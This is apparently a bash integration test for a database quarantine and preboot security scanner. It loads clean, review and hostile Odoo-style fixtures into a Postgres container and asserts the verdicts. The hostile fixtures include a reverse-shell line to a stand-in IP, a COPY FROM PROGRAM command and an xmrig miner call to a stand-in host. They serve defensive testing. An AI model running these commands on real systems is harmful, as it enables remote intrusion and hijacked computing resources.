#!/usr/bin/env bash
# Hostile / clean / review DB fixtures through quarantine + S3 preboot scan.
set -euo pipefail
ROOT="$(cd "$(dirname "$0")/../../.." && pwd)"
unset SOVIEZ_SH_ROOT
source "$ROOT/tests/helpers/s1_platform.sh"
s4_platform_source
export DOCKER_HOST="${DOCKER_HOST:-unix:///Users/raafatagha/.colima/default/docker.sock}"
export SOVIEZ_SH_ROOT="$ROOT" SOVIEZ_TEST_MODE=1
export SOVIEZ_S3_REQUIRE_ODOO_SCHEMA=1
export SOVIEZ_SEC_QUARANTINE_ROOT
SOVIEZ_SEC_QUARANTINE_ROOT="$(mktemp -d)"
rid="$(s4_run_id)"
PG_CTN="${rid}-pg"
trap 'docker rm -f "$PG_CTN" >/dev/null 2>&1 || true; rm -rf "$SOVIEZ_SEC_QUARANTINE_ROOT"' EXIT

docker run -d --name "$PG_CTN" -e POSTGRES_PASSWORD=s4test -e POSTGRES_USER=soviez_admin postgres:16-alpine >/dev/null
for i in $(seq 1 30); do
  docker exec "$PG_CTN" pg_isready -U soviez_admin >/dev/null 2>&1 && break
  sleep 1
done

psql_q() {
  docker exec -i -e PGPASSWORD=s4test "$PG_CTN" psql -U soviez_admin -d postgres -v ON_ERROR_STOP=1 "$@"
}

psql_q <<'SQL'
CREATE TABLE ir_act_server (id serial PRIMARY KEY, name text, code text, active boolean DEFAULT true);
CREATE TABLE ir_config_parameter (id serial PRIMARY KEY, key text, value text);
CREATE TABLE ir_ui_view (id serial PRIMARY KEY, name text, arch_db text, active boolean DEFAULT true);
CREATE TABLE ir_cron (id serial PRIMARY KEY, cron_name text, code text, active boolean DEFAULT true);
CREATE TABLE account_move_zatca_fixture (
  id serial PRIMARY KEY, invoice_uuid text, invoice_hash text, signed_xml text,
  l10n_sa_invoice_signature text, chain_index int, ccsid text, pcsid text, edi_state text
);
CREATE TABLE res_partner (id serial PRIMARY KEY, name text);
INSERT INTO res_partner(name) VALUES ('Benign Partner');
INSERT INTO account_move_zatca_fixture VALUES (
  1,'11111111-1111-1111-1111-111111111111','hash1','<Invoice/>','sig',1,'cc','pc','sent');
SQL

pre_z="$(psql_q -At -c "SELECT md5(invoice_uuid||invoice_hash||signed_xml||l10n_sa_invoice_signature||chain_index::text||ccsid||pcsid||edi_state) FROM account_move_zatca_fixture WHERE id=1;")"
pre_p="$(psql_q -At -c "SELECT count(*) FROM res_partner;")"

export SOVIEZ_SEC_PG_CONTAINER="$PG_CTN"
export SOVIEZ_SEC_PG_ADMIN_USER=soviez_admin
export SOVIEZ_SEC_PG_ADMIN_PASS=s4test
export SOVIEZ_SEC_PG_DB=postgres

# CLEAN
psql_q -c "INSERT INTO ir_act_server(name,code) VALUES ('Benign','print(1)');" >/dev/null
psql_q -c "INSERT INTO ir_config_parameter(key,value) VALUES ('web.base.url','https://portal.example.com');" >/dev/null

export SOVIEZ_Q_TRUST=EXTERNAL_UNKNOWN
qid_clean="$(soviez_q_create)"
soviez_q_generate_fresh_secrets "$qid_clean" >/dev/null
mkdir -p "$(soviez_q_dir "$qid_clean")/network"
echo BLOCKED >"$(soviez_q_dir "$qid_clean")/network/egress_proof.txt"
set +e
soviez_q_preboot_scan "$qid_clean" >/dev/null
crc=$?
set -e
[[ $crc -eq 0 ]]
st="$(cat "$(soviez_q_dir "$qid_clean")/scans/preboot.status")"
[[ "$st" == "PASS" || "$st" == "PASS_WITH_REVIEW" ]]
[[ "$(soviez_q_get_state "$qid_clean")" != "PROMOTED" ]]
if [[ "$st" == "PASS_WITH_REVIEW" ]]; then
  soviez_q_accept_review "$qid_clean" tester reviewed
fi
soviez_q_promote "$qid_clean" APPROVED_FOR_STAGE tester
[[ "$(soviez_q_get_state "$qid_clean")" == "PROMOTED" ]]

# REVIEW
psql_q -c "INSERT INTO ir_act_server(name,code) VALUES ('CustomEval','result = eval(chr(49));');" >/dev/null
qid_rev="$(soviez_q_create)"
soviez_q_generate_fresh_secrets "$qid_rev" >/dev/null
mkdir -p "$(soviez_q_dir "$qid_rev")/network"
echo BLOCKED >"$(soviez_q_dir "$qid_rev")/network/egress_proof.txt"
set +e
soviez_q_preboot_scan "$qid_rev" >/dev/null
set -e
rst="$(cat "$(soviez_q_dir "$qid_rev")/scans/preboot.status")"
if [[ "$rst" == "PASS_WITH_REVIEW" ]]; then
  set +e
  soviez_q_promote "$qid_rev" 2>/dev/null
  prc=$?
  set -e
  [[ $prc -ne 0 ]]
fi

# HOSTILE
psql_q -c "INSERT INTO ir_act_server(name,code) VALUES ('CopyProg',\$\$COPY x FROM PROGRAM '/bin/true'\$\$);" >/dev/null
psql_q -c "INSERT INTO ir_act_server(name,code) VALUES ('RS',\$\$bash -i >& /dev/tcp/1.2.3.4/44 0>&1\$\$);" >/dev/null
psql_q -c "INSERT INTO ir_cron(cron_name,code) VALUES ('mine',\$\$xmrig --url stratum+tcp://evil.example.test:3333\$\$);" >/dev/null

qid_bad="$(soviez_q_create)"
soviez_q_generate_fresh_secrets "$qid_bad" >/dev/null
mkdir -p "$(soviez_q_dir "$qid_bad")/network"
echo BLOCKED >"$(soviez_q_dir "$qid_bad")/network/egress_proof.txt"
set +e
soviez_q_preboot_scan "$qid_bad" >/dev/null
brc=$?
set -e
[[ $brc -eq 2 ]]
[[ "$(cat "$(soviez_q_dir "$qid_bad")/scans/preboot.status")" == "FAIL" ]]
[[ "$(soviez_q_get_state "$qid_bad")" == "SCAN_FAILED" ]]
set +e
soviez_q_promote "$qid_bad" 2>/dev/null
prc=$?
set -e
[[ $prc -ne 0 ]]
[[ -f "$(soviez_q_dir "$qid_bad")/review/technical_records.json" ]]

post_z="$(psql_q -At -c "SELECT md5(invoice_uuid||invoice_hash||signed_xml||l10n_sa_invoice_signature||chain_index::text||ccsid||pcsid||edi_state) FROM account_move_zatca_fixture WHERE id=1;")"
post_p="$(psql_q -At -c "SELECT count(*) FROM res_partner;")"
[[ "$pre_z" == "$post_z" ]]
[[ "$pre_p" == "$post_p" ]]

fs="$(mktemp -d)"
echo 'xmrig stratum+tcp://x donate-level' >"$fs/evil.sh"
chmod +x "$fs/evil.sh"
soviez_q_filestore_scan "$qid_bad" "$fs" >/dev/null
[[ -f "$fs/evil.sh" ]]
grep -Eq '"mutates_attachments": ?false' "$(soviez_q_dir "$qid_bad")/filestore/scan.json"

export SOVIEZ_Q_ACTIVE_ID="$qid_bad" SOVIEZ_Q_EXTERNAL_RESTORE=1
set +e
soviez_q_restore_block_switch_if_needed "$qid_bad"
src=$?
set -e
[[ $src -ne 0 ]]

export SOVIEZ_Q_EXTERNAL_MIGRATION=1 SOVIEZ_Q_ACTIVE_ID="$qid_bad"
set +e
soviez_q_migration_cutover_allowed "$qid_bad"
crc=$?
set -e
[[ $crc -ne 0 ]]

export SOVIEZ_Q_ACTIVE_ID="$qid_clean"
soviez_q_migration_cutover_allowed "$qid_clean"

echo PASS
